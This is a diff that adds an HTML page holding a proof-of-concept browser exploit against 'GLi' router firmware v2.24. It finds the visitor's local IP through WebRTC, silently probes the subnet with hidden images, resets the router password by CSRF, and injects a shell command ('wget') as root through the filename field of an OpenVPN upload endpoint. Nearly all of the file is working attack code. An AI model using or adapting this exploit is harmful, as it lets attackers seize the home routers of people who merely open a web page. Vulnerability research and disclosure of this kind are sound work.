@@ -1,0 +1,167 @@
+<html>
+    <head>
+	<title>GLi Firmware v2.24 root code execution CSRF</title>
+    </head>
+    <body>
+	<script>
+		
+     /* GLi - Firmware v2.24 CSRF Unauthenticated Command Execution PoC
+	---------------------------------------------------------------
+	
+	The router's initial password set function is left exposed after the user sets their password for the first time.
+	So, we set a new password and the browser gets a cookie sent back.
+	Then, we can exploit the authenticated code exec in /cgi-bin/openvpn_cgi, in the filename parameter.
+
+	Getting a local IP can be unreliable sometimes, but you can call checkForVuln("192.168.8.20") in console if it doesn't grab an IP automatically */
+	
+	var vulnDevice = "GLi - Firmware 2.24"; // For reference 
+	var fingerprint = "/images/75e.png";   	// Give a path to an image which is statistically unlikely to appear on two distinct devices on a class C network. 
+						// Helps to hone in on the correct target, so we don't have to spray the exploit everywhere.
+
+	// First exploit: resetting the password as unauth'd user - we get a cookie back from this
+	var exploitOnePath = "/cgi-bin/login_cgi";	// The vulnerable path
+	var newPassword = "goodlife";			// The password you want to set
+	
+	// Second exploit: Code injection in the OpenVPN filename parameter
+	var exploitTwoPath = "/cgi-bin/openvpn_cgi";	// Vulnerable path for code execution
+	var codeToInject = "wget example.com"; 		// Doesn't like forward slashes, so get creative.
+
+	// Gets called when we find the right IP
+	function exploitChain(url, id){
+		// Part one - change the root password
+		// XMLHttpRequest failed in testing because of the SOP, so this is an inelegant hack to get around that
+
+		// Create an iframe for posting into
+		var exframe = document.createElement("iframe");
+		var exframeName = "exploitOneFrame";
+		document.body.appendChild(exframe);
+		exframe.style.display = "none";
+		exframe.contentWindow.name = exframeName;
+
+		// Create a hidden form, which will be posted into the iframe
+		var exform = document.createElement("form");
+		exform.target = exframeName;
+		exform.action = url + exploitOnePath;
+		exform.method = "POST";
+
+		// Add the params to the form we're building
+		var input = document.createElement("input");
+		input.type = "hidden";
+		input.name = "action";
+		input.value = "newpassword";
+		exform.appendChild(input);
+		
+		var input2 = document.createElement("input");
+		input.type = "hidden";
+		input.name = "password";
+		input.value = newPassword; // grabs the password from the global variable up there ^
+		exform.appendChild(input);
+
+		document.body.appendChild(exform);
+		
+		// Submit the password-change form
+		exform.submit();
+		console.log("Part one sent to " + url + exploitOnePath); 
+		
+		// Part two - Code injection in the filename parameter of the OpenVPN upload functionality
+		// This works without breaking the SOP, although you will get an error back because we can't read the response, but who cares? We just executed code as root.
+		var exTwo = new XMLHttpRequest();
+		exTwo.open("POST", url + exploitTwoPath, true);
+		exTwo.setRequestHeader("Accept", "*/*");
+		exTwo.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------127718696515441795831516812981");
+		exTwo.withCredentials = true;
+		var body = "-----------------------------127718696515441795831516812981\r\n" + 
+			"Content-Disposition: form-data; name=\"file\"; filename=\"x.zip\';" + codeToInject + ";echo \'\r\n" + 
+			"Content-Type: application/octet-stream\r\n" + 
+			"\r\n" + 
+			"\r\n" + 
+			"-----------------------------127718696515441795831516812981--\r\n";
+		var aBody = new Uint8Array(body.length);
+		for (var i = 0; i < aBody.length; i++){
+			aBody[i] = body.charCodeAt(i);
+		}
+		exTwo.send(new Blob([aBody]));
+		console.log("Part two sent to " + url + exploitTwoPath);
+	}
+
+	// The main function, does the search then calls exploitChain() when it finds something
+	function checkForVuln(localIP) {
+		var httpOrHttps = "http://";
+		var port = 80;
+		
+		if(localIP==null||localIP==""){
+			var baseIP = document.getElementById("localIP").value;
+		} else {
+			var baseIP = localIP;
+		}
+
+		var ipArray = baseIP.split(".");
+		var classC = ipArray[0] + "." + ipArray[1] + "." + ipArray[2] + ".";
+
+		// Check we've actually got a local IP address
+		if(baseIP==null || baseIP==""){
+			console.log("null ip");
+		} else {
+			console.log("sweeping...");
+
+			// Spawn a container for dumping image links into
+			var sweep = document.createElement("sweep");
+			document.body.appendChild(sweep);
+
+			function check_host(url, id){
+				// console.log("checking " + url);
+				var fpTest = document.createElement("img");
+				fpTest.src = url + fingerprint;
+				fpTest.id = "fp_test_" + id;
+				// hidden, none, 0px etc for stealth
+				fpTest.style.visibility = "hidden";
+				fpTest.style.display = "none";
+				fpTest.style.width = "0px";
+				fpTest.style.height = "0px"; 
+
+				// If an image loads, we know we found something
+				fpTest.onload = function(){
+					console.log("Found " + vulnDevice + " at: " + url);
+					exploitChain(url, id);
+				}
+				sweep.appendChild(fpTest);
+				setTimeout(function(){
+				    sweep.removeChild(fpTest);
+				}, 2000); // Trash the links if they havn't loaded after 2 seconds.
+			}
+		}
+		
+		// This is where we just iterate over the local class C, looking for GLi routers.
+		for(var i=1; i<255; i++){
+			var host = classC + i;
+			check_host(httpOrHttps + host + ":" + port, i);
+		}
+	}
+
+	// Creates a text input to dump whatever local IP into
+	var lipContainer = document.createElement("input");
+	lipContainer.style.visibility = "hidden";
+	lipContainer.type = "text";
+	lipContainer.id = "localIP";
+	document.body.appendChild(lipContainer);
+
+	// Not my code, but works 90% of the time to grab at least the correct first 3 octets of the local IP
+	window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+	var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
+	pc.createDataChannel("");
+	pc.createOffer(pc.setLocalDescription.bind(pc), noop);
+	pc.onicecandidate = function(ice){
+		if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
+		var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
+		document.getElementById("localIP").value = myIP;
+		pc.onicecandidate = noop;
+
+		// Do the main exploit
+		checkForVuln(myIP);
+	}
+	</script>
+	
+    </body>
+</html>
+
+
